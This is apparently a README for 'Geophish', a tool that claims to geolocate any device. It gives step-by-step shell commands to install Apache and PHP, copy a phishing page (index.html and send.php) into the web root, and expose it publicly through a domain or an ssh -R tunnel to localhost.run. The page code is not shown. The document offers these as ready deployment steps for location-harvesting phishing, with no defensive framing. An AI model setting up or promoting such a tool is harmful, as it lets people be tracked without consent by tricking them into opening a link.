# Geophish
Geolocate any device

# How to use
1.  Update and install apache2 and PHP
```bash
sudo apt update
sudo apt upgrade -y
sudo apt install -y apache2 php libapache2-mod-php
sudo service apache2 restart
```
2. Host files and set permissions
```bash
cd
git clone https://github.com/thegoodhackertv/Geophish
sudo cp Geophish/index.html Geophish/send.php /var/www/html
sudo chown -R www-data:www-data /var/www/html
```

## First way
Host files on your own server, use a domain and install certbot to enable HTTP(S)

## Second way (Easiest)
`ssh -R 80:localhost:80 nokey@localhost.run`
